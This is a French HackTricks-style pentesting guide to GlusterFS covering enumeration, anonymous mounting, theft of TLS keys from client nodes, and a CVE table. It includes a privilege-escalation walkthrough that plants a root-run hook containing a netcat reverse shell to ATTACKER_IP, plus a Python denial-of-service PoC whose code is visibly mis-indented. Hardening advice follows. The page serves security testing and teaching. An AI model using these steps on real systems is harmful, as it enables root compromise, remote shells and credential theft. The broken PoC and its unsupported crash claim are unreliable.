# 24007-24008-24009-49152 - Pentesting GlusterFS

{{#include ../banners/hacktricks-training.md}}

## Informations de base

**GlusterFS** est un **système de fichiers distribué** qui combine le stockage de plusieurs serveurs en un **espace de noms unifié**. Le démon de gestion (`glusterd`) écoute par défaut sur **24007/TCP** et instruit les briques de plan de données qui commencent à **49152/TCP** (un port par brique, en incrémentant). Les versions antérieures à 9.x utilisaient **24008–24009/TCP** pour le transport des briques, vous rencontrerez donc encore ces ports dans les clusters hérités.
```
PORT      STATE  SERVICE        VERSION
24007/tcp open   glusterd       GlusterFS (RPC)
49152/tcp open   gluster-brick  SSL (TLS optional)
```
> Astuce : 24007 répond aux appels RPC même lorsque les nœuds de stockage uniquement **n'**exportent aucun volume ; par conséquent, le service est une cible pivot fiable au sein de grandes infrastructures.

## Énumération

Installez les utilitaires client sur votre machine d'attaque :
```bash
sudo apt install -y glusterfs-cli glusterfs-client   # Debian/Ubuntu
```
1. **Découverte des pairs et santé**
```bash
# List peers (works without authentication in default setups)
gluster --remote-host 10.10.11.131 peer status
```
2. **Reconnaissance de volume**
```bash
# Retrieve the list of all volumes and their configuration
gluster --remote-host 10.10.11.131 volume info all
```
3. **Monter sans privilèges**
```bash
sudo mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/gluster
```
Si le montage échoue, vérifiez `/var/log/glusterfs/<vol_name>-<uid>.log` du côté client. Les problèmes courants sont :

* Application de TLS (`option transport.socket.ssl on`)
* Contrôle d'accès basé sur l'adresse (`option auth.allow <cidr>`)

### Dépannage des certificats

Volez les fichiers suivants depuis n'importe quel nœud client autorisé et placez-les dans `/etc/ssl/` (ou le répertoire indiqué dans le journal des erreurs) :
```
/etc/ssl/glusterfs.pem
/etc/ssl/glusterfs.key
/etc/ssl/glusterfs.ca
```
---

## Vulnérabilités Connues (2022-2025)

| CVE | Versions affectées | Impact | Remarques |
|-----|-------------------|--------|-------|
| **CVE-2022-48340** | 10.0–10.4, 11.0 | Utilisation après libération dans `dht_setxattr_mds_cbk` accessible via le réseau | **DoS** à distance et probable RCE. Corrigé dans 10.4.1 / 11.1. |
| **CVE-2023-26253** | < 11.0 | Lecture hors limites dans le gestionnaire de notification FUSE | Plantage à distance via des opérations FS conçues ; PoC public disponible. |
| **CVE-2023-3775** | < 10.5 / 11.1 | Validation incorrecte des permissions lors du montage de `gluster_shared_storage` | Permet à tout client non authentifié de monter le volume admin – conduit à **priv-esc** expliqué ci-dessous. |

> Vérifiez toujours `gluster --version` **sur chaque nœud** ; les clusters hétérogènes sont courants après des mises à jour partielles.

### Exploitation de `gluster_shared_storage` (Escalade de Privilèges)

Même dans les versions récentes, de nombreux administrateurs laissent le volume spécial `gluster_shared_storage` lisible par tous car cela simplifie la géo-réplication. Le volume contient des modèles de cronjob qui s'exécutent avec **root** sur chaque nœud.
```bash
# 1. Mount admin volume anonymously
mkdir /tmp/gss && sudo mount -t glusterfs 10.10.11.131:/gluster_shared_storage /tmp/gss

# 2. Drop malicious script that gets synchronised cluster-wide
cat <<'EOF' > /tmp/gss/hooks/1/start/post/test.sh
#!/bin/bash
nc -e /bin/bash ATTACKER_IP 4444 &
EOF
chmod +x /tmp/gss/hooks/1/start/post/test.sh

# 3. Wait until glusterd distributes the hook and executes it as root
```
Si `hooks/1/` n'est pas présent, recherchez `/ss_bricks/` – le chemin exact peut varier selon la version majeure.

### PoC de déni de service (CVE-2023-26253)
```python
#!/usr/bin/env python3
# Minimal reproducer: sends malformed NOTIFY_REPLY XDR frame to 24007
import socket, xdrlib, struct
p = xdrlib.Packer(); p.pack_uint(0xdeadbeef)
with socket.create_connection(("10.10.11.131",24007)) as s:
s.send(struct.pack("!L", len(p.get_buffer())|0x80000000))
s.send(p.get_buffer())
```
L'exécution du script fait planter `glusterfsd` < 11.0.

---

## Renforcement et Détection

* **Mise à jour** – la version LTS actuelle est 11.1 (juillet 2025). Tous les CVE ci-dessus sont corrigés.
* Activer **TLS** pour chaque brique :

```bash
gluster volume set <vol> transport.socket.ssl on
gluster volume set <vol> transport.socket.ssl-cert /etc/ssl/glusterfs.pem
```
* Restreindre les clients avec des listes CIDR :

```bash
gluster volume set <vol> auth.allow 10.0.0.0/24
```
* Exposer le port de gestion 24007 uniquement sur un **VLAN privé** ou via des tunnels SSH.
* Surveiller les journaux : `tail -f /var/log/glusterfs/glusterd.log` et configurer la fonctionnalité **audit-log** (`volume set <vol> features.audit-log on`).

---

## Références

* [GlusterFS security advisories](https://docs.gluster.org/en/latest/release-notes/#security)
* [CVE-2023-26253 PoC – github.com/tinynetwork/gluster-notify-crash](https://github.com/tinynetwork/gluster-notify-crash)
{{#include ../banners/hacktricks-training.md}}
